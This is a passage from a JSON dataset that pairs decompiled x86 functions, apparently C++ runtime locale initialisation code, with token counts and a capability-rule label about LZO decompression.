        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a6e20(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52cc40;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004bb4b0();\n    *in_ECX = 0x52c480;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x524734;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = \"POSIX\";\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004bb4b0();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "004a6ff0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a6ff0(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52cc40;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004bb4b0();\n    *in_ECX = 0x52c480;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x524734;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = \"POSIX\";\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004bb4b0();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "004a74a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004a74a0(uint *param_1, uint param_2)\n\n{\n    fcn.004a0d00(param_2);\n    *param_1 = 0x52c51c;\n    return;\n}\n",
        "token_count": 56
    },
    "004a7560": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a7560(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uVar3;\n    int32_t *piVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint uVar7;\n    code *pcVar8;\n    int32_t in_ECX;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar4 = fcn.004c05e0(arg_8h);\n    if (*(*piVar4 + 0x10) == 0x477da0) {\n        fcn.0048ccb0(*(piVar4[2] + 8), &var_27h);\n    }\n    else {\n        (**(*piVar4 + 0x10))(piVar4);\n    }\n    uVar6 = *(var_24h + -0xc);\n    *(in_ECX + 0xc) = uVar6;\n    pcVar5 = fcn.004c2c50(uVar6);\n    fcn.0044bff0(pcVar5, *(in_ECX + 0xc), 0);\n    if (*(in_ECX + 0xc) == 0) {\n        *(in_ECX + 0x10) = 0;\n        pcVar8 = *(*piVar4 + 0x14);\n        if (pcVar8 == 0x477dd0) goto code_r0x004a75f9;\ncode_r0x004a7847:\n        (*pcVar8)(piVar4);\n    }\n    else {\n        *(in_ECX + 0x10) = *pcVar5 - 1U < 0x7e;\n        pcVar8 = *(*piVar4 + 0x14);\n        if (pcVar8 != 0x477dd0) goto code_r0x004a7847;\ncode_r0x004a75f9:\n        fcn.0048ccb0(*(piVar4[2] + 0x14), &var_26h);\n    }\n    uVar6 = *(var_20h + -0xc);\n    *(in_ECX + 0x18) = uVar6;\n    uVar6 = fcn.004c2c50(uVar6);\n    fcn.0044bff0(uVar6, *(in_ECX + 0x18), 0);\n    if (*(*piVar4 + 0x18) == 0x477e00) {\n        fcn.0048ccb0(*(piVar4[2] + 0x1c), &var_25h);\n    }\n    else {\n        (**(*piVar4 + 0x18))(piVar4);\n    }\n    uVar7 = *(var_1ch + -0xc);\n    *(in_ECX + 0x20) = uVar7;\n    uVar7 = fcn.004c2c50(uVar7);\n    fcn.0044bff0(uVar7, *(in_ECX + 0x20), 0);\n    if (*(*piVar4 + 8) == 0x477e70) {\n        uVar3 = *(piVar4[2] + 0x24);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 8))();\n    }\n    *(in_ECX + 0x24) = uVar3;\n    if (*(*piVar4 + 0xc) == 0x477e80) {\n        uVar3 = *(piVar4[2] + 0x25);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 0xc))();\n    }\n    *(in_ECX + 0x25) = uVar3;\n    piVar4 = fcn.004c0160(arg_8h);\n    puVar2 = *0x516da4;\n    if (*(piVar4 + 7) == '\\x01') {\ncode_r0x004a7716:\n        *(in_ECX + 0x26) = *puVar2;\n        *(in_ECX + 0x2a) = puVar2[1];\n        *(in_ECX + 0x2e) = puVar2[2];\n        *(in_ECX + 0x32) = puVar2[3];\n        *(in_ECX + 0x36) = puVar2[4];\n        *(in_ECX + 0x3a) = puVar2[5];\n        *(in_ECX + 0x3e) = puVar2[6];\n        *(in_ECX + 0x42) = puVar2[7];\n        *(in_ECX + 0x46) = puVar2[8];\n    }\n    else {\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.004512b0();\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        else {\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        if (pcVar8 == 0x451530) goto code_r0x004a7716;\n        (*pcVar8)(puVar2, puVar2 + 9, in_ECX + 0x26);\n    }\n    puVar2 = *0x516da0;\n    if (*(piVar4 + 7) != '\\x01') {\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.004512b0();\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        else {\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        if (pcVar8 != 0x451530) {\n            (*pcVar8)(puVar2, puVar2 + 0x1a, in_ECX + 0x4a);\n            goto code_r0x004a77a5;\n        }\n    }\n    *(in_ECX + 0x4a) = *puVar2;\n    *(in_ECX + 0x4e) = puVar2[1];\n    *(in_ECX + 0x52) = puVar2[2];\n    *(in_ECX + 0x56) = puVar2[3];\n    *(in_ECX + 0x5a) = puVar2[4];\n    *(in_ECX + 0x5e) = puVar2[5];\n    *(in_ECX + 0x62) = *(puVar2 + 6);\ncode_r0x004a77a5:\n    iVar1 = *0x515a34;\n    *(in_ECX + 100) = 1;\n    *(in_ECX + 8) = pcVar5;\n    *(in_ECX + 0x14) = uVar6;\n    *(in_ECX + 0x1c) = uVar7;\n    if (iVar1 == 0) {\n        iVar1 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_1ch + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.0048b610(&var_25h);\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_20h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.0048b610(&var_25h);\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_24h + -4);\n        *(var_24h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_24h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.0048b610(&var_25h);\n        return;\n    }\n    return;\n}\n",
        "token_count": 1959
    },
    "004a7c30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a7c30(uint arg_8h)\n\n{\n    ushort uVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar2 = fcn.004c0640(arg_8h);\n    if (*(*piVar2 + 0x10) == 0x477fb0) {\n        fcn.0048ccb0(*(piVar2[2] + 8), &var_27h);\n    }\n    else {\n        (**(*piVar2 + 0x10))(piVar2);\n    }\n    uVar4 = *(var_24h + -0xc);\n    *(in_ECX + 0xc) = uVar4;\n    pcVar3 = fcn.004c2c50(uVar4);\n    fcn.0044bff0(pcVar3, *(in_ECX + 0xc), 0);\n    if (*(in_ECX + 0xc) == 0) {\n        *(in_ECX + 0x10) = 0;\n        pcVar6 = *(*piVar2 + 0x14);\n        if (pcVar6 != 0x477fe0) goto code_r0x004a7eaf;\ncode_r0x004a7cc6:\n        fcn.00484f20(*(piVar2[2] + 0x14), &var_26h);\n        uVar5 = *(var_20h + -0xc);\n        *(in_ECX + 0x18) = uVar5;\n        if (0x3ffffffe < uVar5) goto code_r0x004a7ed3;\ncode_r0x004a7cf8:\n        var_2ch = &var_20h;\n        uVar4 = fcn.004c2c50(uVar5 * 2);\n        fcn.0044b110(uVar4, *(in_ECX + 0x18), 0);\n        if (*(*piVar2 + 0x18) == 0x478010) {\n            fcn.00484f20(*(piVar2[2] + 0x1c), &var_25h);\n            uVar5 = *(var_1ch + -0xc);\n            *(in_ECX + 0x20) = uVar5;\n            if (0x3ffffffe < uVar5) goto code_r0x004a7fa9;\ncode_r0x004a7d66:\n            var_2ch = fcn.004c2c50(uVar5 * 2);\n            fcn.0044b110(var_2ch, *(in_ECX + 0x20), 0);\n            iVar7 = *piVar2;\n            if (*(iVar7 + 8) == 0x478080) {\n                uVar1 = *(piVar2[2] + 0x24);\n            }\n            else {\n                uVar1 = (**(iVar7 + 8))();\n                iVar7 = *piVar2;\n            }\n            *(in_ECX + 0x24) = uVar1;\n            pcVar6 = *(iVar7 + 0xc);\n            if (pcVar6 != 0x478090) goto code_r0x004a7fb0;\n            uVar1 = *(piVar2[2] + 0x26);\n        }\n        else {\n            (**(*piVar2 + 0x18))(piVar2);\n            uVar5 = *(var_1ch + -0xc);\n            *(in_ECX + 0x20) = uVar5;\n            if (uVar5 < 0x3fffffff) goto code_r0x004a7d66;\ncode_r0x004a7fa9:\n            pcVar6 = fcn.004c33a0();\ncode_r0x004a7fb0:\n            uVar1 = (*pcVar6)();\n        }\n        *(in_ECX + 0x26) = uVar1;\n        piVar2 = fcn.004c01c0(arg_8h);\n        (**(*piVar2 + 0x2c))(*0x516da4, *0x516da4 + 0x24, in_ECX + 0x28);\n        (**(*piVar2 + 0x2c))(*0x516da0, *0x516da0 + 0x1a, in_ECX + 0x70);\n        *(in_ECX + 8) = pcVar3;\n        iVar7 = *0x515a34;\n        *(in_ECX + 0xa4) = 1;\n        *(in_ECX + 0x14) = uVar4;\n        *(in_ECX + 0x1c) = var_2ch;\n        if (iVar7 == 0) {\n            iVar7 = *(var_1ch + -4);\n            *(var_1ch + -4) = iVar7 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = var_1ch + -4;\n            iVar7 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar7 < 1) {\n            fcn.00483750();\n        }\n        if (*0x515a34 == 0) {\n            iVar7 = *(var_20h + -4);\n            *(var_20h + -4) = iVar7 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = var_20h + -4;\n            iVar7 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar7 < 1) {\n            fcn.00483750(&var_25h);\n        }\n        if (*0x515a34 == 0) {\n            iVar7 = *(var_24h + -4);\n            *(var_24h + -4) = iVar7 + -1;\n            goto joined_r0x004a7e85;\n        }\n    }\n    else {\n        *(in_ECX + 0x10) = *pcVar3 - 1U < 0x7e;\n        pcVar6 = *(*piVar2 + 0x14);\n        if (pcVar6 == 0x477fe0) goto code_r0x004a7cc6;\ncode_r0x004a7eaf:\n        (*pcVar6)(piVar2);\n        uVar5 = *(var_20h + -0xc);\n        *(in_ECX + 0x18) = uVar5;\n        if (uVar5 < 0x3fffffff) goto code_r0x004a7cf8;\ncode_r0x004a7ed3:\n        fcn.004c33a0();\n        var_24h = extraout_ECX;\n    }\n    LOCK();\n    piVar2 = var_24h + -4;\n    iVar7 = *piVar2;\n    *piVar2 = *piVar2 + -1;\njoined_r0x004a7e85:\n    if (0 < iVar7) {\n        return;\n    }\n    fcn.0048b610(&var_25h);\n    return;\n}\n",
        "token_count": 1721
    },
    "004a8270": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004a8270(uint *param_1, uint param_2)\n\n{\n    fcn.0048f5f0(param_2);\n    *param_1 = 0x52c550;\n    return;\n}\n",
        "token_count": 55
    },
    "004a9a30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a9a30(uint arg_8h)\n\n{\n    bool bVar1;\n    uchar uVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar3 = fcn.004bff20(arg_8h);\n    if (*(*piVar3 + 8) == 0x44ca40) {\n        uVar2 = *(piVar3[2] + 0x11);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 8))();\n    }\n    *(in_ECX + 0x11) = uVar2;\n    if (*(*piVar3 + 0xc) == 0x44cab0) {\n        uVar2 = *(piVar3[2] + 0x12);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 0xc))();\n    }\n    *(in_ECX + 0x12) = uVar2;\n    if (*(*piVar3 + 0x20) == 0x44ca30) {\n        uVar5 = *(piVar3[2] + 0x2c);\n    }\n    else {\n        uVar5 = (**(*piVar3 + 0x20))();\n    }\n    *(in_ECX + 0x2c) = uVar5;\n    if (*(*piVar3 + 0x10) == 0x44c890) {\n        fcn.0048ccb0(*(piVar3[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar3 + 0x10))(piVar3);\n    }\n    uVar5 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar5;\n    pcVar4 = fcn.004c2c50(uVar5);\n    fcn.0044bff0(pcVar4, *(in_ECX + 0xc), 0);\n    bVar1 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        bVar1 = *pcVar4 - 1U < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar1;\n    if (*(*piVar3 + 0x14) == 0x44ca00) {\n        fcn.0048ccb0(*(piVar3[2] + 0x14), &var_2bh);\n    }\n    else {\n        (**(*piVar3 + 0x14))(piVar3);\n    }\n    uVar5 = *(var_24h + -0xc);\n    *(in_ECX + 0x18) = uVar5;\n    uVar5 = fcn.004c2c50(uVar5);\n    fcn.0044bff0(uVar5, *(in_ECX + 0x18), 0);\n    if (*(*piVar3 + 0x18) == 0x44ca80) {\n        fcn.0048ccb0(*(piVar3[2] + 0x1c), &var_2ah);\n    }\n    else {\n        (**(*piVar3 + 0x18))(piVar3);\n    }\n    uVar6 = *(var_20h + -0xc);\n    *(in_ECX + 0x20) = uVar6;\n    uVar6 = fcn.004c2c50(uVar6);\n    fcn.0044bff0(uVar6, *(in_ECX + 0x20), 0);\n    if (*(*piVar3 + 0x1c) == 0x44ca50) {\n        fcn.0048ccb0(*(piVar3[2] + 0x24), &var_29h);\n    }\n    else {\n        (**(*piVar3 + 0x1c))(piVar3);\n    }\n    uVar7 = *(var_1ch + -0xc);\n    *(in_ECX + 0x28) = uVar7;\n    uVar7 = fcn.004c2c50(uVar7);\n    fcn.0044bff0(uVar7, *(in_ECX + 0x28), 0);\n    if (*(*piVar3 + 0x24) == 0x44c910) {\n        uVar8 = *(piVar3[2] + 0x30);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x24))();\n    }\n    *(in_ECX + 0x30) = uVar8;\n    if (*(*piVar3 + 0x28) == 0x44c900) {\n        uVar8 = *(piVar3[2] + 0x34);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x28))();\n    }\n    *(in_ECX + 0x34) = uVar8;\n    fcn.004c0160(arg_8h);\n    fcn.00451460(*0x516da8, *0x516da8 + 0xb, in_ECX + 0x38);\n    *(in_ECX + 0x43) = 1;\n    *(in_ECX + 8) = pcVar4;\n    *(in_ECX + 0x14) = uVar5;\n    *(in_ECX + 0x1c) = uVar6;\n    *(in_ECX + 0x24) = uVar7;\n    fcn.0048b630(&var_29h);\n    fcn.0048b630(&var_29h);\n    fcn.0048b630(&var_29h);\n    fcn.0048b630(&var_29h);\n    return;\n}\n",
        "token_count": 1435
    },
    "004aa110": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004aa110(uint arg_8h)\n\n{\n    bool bVar1;\n    uchar uVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar3 = fcn.004bff80(arg_8h);\n    if (*(*piVar3 + 8) == 0x44cd70) {\n        uVar2 = *(piVar3[2] + 0x11);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 8))();\n    }\n    *(in_ECX + 0x11) = uVar2;\n    if (*(*piVar3 + 0xc) == 0x44cde0) {\n        uVar2 = *(piVar3[2] + 0x12);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 0xc))();\n    }\n    *(in_ECX + 0x12) = uVar2;\n    if (*(*piVar3 + 0x20) == 0x44cd60) {\n        uVar5 = *(piVar3[2] + 0x2c);\n    }\n    else {\n        uVar5 = (**(*piVar3 + 0x20))();\n    }\n    *(in_ECX + 0x2c) = uVar5;\n    if (*(*piVar3 + 0x10) == 0x44cbc0) {\n        fcn.0048ccb0(*(piVar3[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar3 + 0x10))(piVar3);\n    }\n    uVar5 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar5;\n    pcVar4 = fcn.004c2c50(uVar5);\n    fcn.0044bff0(pcVar4, *(in_ECX + 0xc), 0);\n    bVar1 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        bVar1 = *pcVar4 - 1U < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar1;\n    if (*(*piVar3 + 0x14) == 0x44cd30) {\n        fcn.0048ccb0(*(piVar3[2] + 0x14), &var_2bh);\n    }\n    else {\n        (**(*piVar3 + 0x14))(piVar3);\n    }\n    uVar5 = *(var_24h + -0xc);\n    *(in_ECX + 0x18) = uVar5;\n    uVar5 = fcn.004c2c50(uVar5);\n    fcn.0044bff0(uVar5, *(in_ECX + 0x18), 0);\n    if (*(*piVar3 + 0x18) == 0x44cdb0) {\n        fcn.0048ccb0(*(piVar3[2] + 0x1c), &var_2ah);\n    }\n    else {\n        (**(*piVar3 + 0x18))(piVar3);\n    }\n    uVar6 = *(var_20h + -0xc);\n    *(in_ECX + 0x20) = uVar6;\n    uVar6 = fcn.004c2c50(uVar6);\n    fcn.0044bff0(uVar6, *(in_ECX + 0x20), 0);\n    if (*(*piVar3 + 0x1c) == 0x44cd80) {\n        fcn.0048ccb0(*(piVar3[2] + 0x24), &var_29h);\n    }\n    else {\n        (**(*piVar3 + 0x1c))(piVar3);\n    }\n    uVar7 = *(var_1ch + -0xc);\n    *(in_ECX + 0x28) = uVar7;\n    uVar7 = fcn.004c2c50(uVar7);\n    fcn.0044bff0(uVar7, *(in_ECX + 0x28), 0);\n    if (*(*piVar3 + 0x24) == 0x44cc40) {\n        uVar8 = *(piVar3[2] + 0x30);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x24))();\n    }\n    *(in_ECX + 0x30) = uVar8;\n    if (*(*piVar3 + 0x28) == 0x44cc30) {\n        uVar8 = *(piVar3[2] + 0x34);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x28))();\n    }\n    *(in_ECX + 0x34) = uVar8;\n    fcn.004c0160(arg_8h);\n    fcn.00451460(*0x516da8, *0x516da8 + 0xb, in_ECX + 0x38);\n    *(in_ECX + 0x43) = 1;\n    *(in_ECX + 8) = pcVar4;\n    *(in_ECX + 0x14) = uVar5;\n    *(in_ECX + 0x1c) = uVar6;\n    *(in_ECX + 0x24) = uVar7;\n    fcn.0048b630(&var_29h);\n    fcn.0048b630(&var_29h);\n    fcn.0048b630(&var_29h);\n    fcn.0048b630(&var_29h);\n    return;\n}\n",
        "token_count": 1434
    },
    "004aa7f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004aa7f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    code *pcVar8;\n    int32_t in_ECX;\n    uint *puVar9;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh [2];\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar4 = fcn.004bffe0(arg_8h);\n    if (*(*piVar4 + 8) == 0x44d0a0) {\n        *(in_ECX + 0x12) = *(piVar4[2] + 0x12);\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 != 0x44d110) goto code_r0x004aaba8;\ncode_r0x004aa833:\n        *(in_ECX + 0x14) = *(piVar4[2] + 0x14);\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 != 0x44d090) goto code_r0x004aabc0;\ncode_r0x004aa84e:\n        uVar7 = *(piVar4[2] + 0x30);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 8))();\n        *(in_ECX + 0x12) = uVar3;\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 == 0x44d110) goto code_r0x004aa833;\ncode_r0x004aaba8:\n        uVar3 = (*pcVar8)();\n        *(in_ECX + 0x14) = uVar3;\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 == 0x44d090) goto code_r0x004aa84e;\ncode_r0x004aabc0:\n        uVar7 = (*pcVar8)();\n    }\n    *(in_ECX + 0x30) = uVar7;\n    if (*(*piVar4 + 0x10) == 0x44cef0) {\n        fcn.0048ccb0(*(piVar4[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar4 + 0x10))(piVar4);\n    }\n    uVar7 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar7;\n    puVar5 = fcn.004c2c50(uVar7);\n    fcn.0044bff0(puVar5, *(in_ECX + 0xc), 0);\n    bVar2 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        var_40h = var_40h & 0xffffff00 | *puVar5;\n        bVar2 = *puVar5 - 1 < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar2;\n    if (*(*piVar4 + 0x14) == 0x44d060) {\n        fcn.00484f20(*(piVar4[2] + 0x18), var_2bh);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x004aabfe;\ncode_r0x004aa907:\n        var_48h = fcn.004c2c50(uVar6 * 2);\n        fcn.0044b110(var_48h, *(in_ECX + 0x1c), 0);\n        pcVar8 = *(*piVar4 + 0x18);\n        if (pcVar8 != 0x44d0e0) goto code_r0x004aac03;\n        fcn.00484f20();\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x004aa973;\ncode_r0x004aac24:\n        puVar9 = &var_20h;\n        pcVar8 = fcn.004c33a0();\n    }\n    else {\n        (**(*piVar4 + 0x14))(piVar4);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x004aa907;\ncode_r0x004aabfe:\n        pcVar8 = fcn.004c33a0();\ncode_r0x004aac03:\n        (*pcVar8)(piVar4);\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x004aac24;\ncode_r0x004aa973:\n        var_44h = fcn.004c2c50(uVar6 * 2);\n        fcn.0044b110(var_44h, *(in_ECX + 0x24), 0);\n        if (*(*piVar4 + 0x1c) == 0x44d0b0) {\n            fcn.00484f20(*(piVar4[2] + 0x28), &var_29h);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (0x3ffffffe < uVar6) goto code_r0x004aac67;\ncode_r0x004aa9e0:\n            var_40h = fcn.004c2c50(uVar6 * 2);\n            fcn.0044b110(var_40h, *(in_ECX + 0x2c), 0);\n            pcVar8 = *(*piVar4 + 0x24);\n            if (pcVar8 != 0x44cf70) goto code_r0x004aac70;\n            uVar7 = *(piVar4[2] + 0x34);\n        }\n        else {\n            (**(*piVar4 + 0x1c))(piVar4);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (uVar6 < 0x3fffffff) goto code_r0x004aa9e0;\ncode_r0x004aac67:\n            pcVar8 = fcn.004c33a0();\ncode_r0x004aac70:\n            uVar7 = (*pcVar8)();\n        }\n        puVar9 = &var_29h;\n        *(in_ECX + 0x34) = uVar7;\n        pcVar8 = *(*piVar4 + 0x28);\n        if (pcVar8 == 0x44cf60) {\n            uVar7 = *(piVar4[2] + 0x38);\n            goto code_r0x004aaa3b;\n        }\n    }\n    uVar7 = (*pcVar8)();\ncode_r0x004aaa3b:\n    *(in_ECX + 0x38) = uVar7;\n    piVar4 = fcn.004c01c0(arg_8h);\n    (**(*piVar4 + 0x2c))(*0x516da8, *0x516da8 + 0xb, in_ECX + 0x3c);\n    *(in_ECX + 0x52) = 1;\n    *(in_ECX + 8) = puVar5;\n    *(in_ECX + 0x18) = var_48h;\n    *(in_ECX + 0x20) = var_44h;\n    *(in_ECX + 0x28) = var_40h;\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_1ch + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.00483750(puVar9);\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) 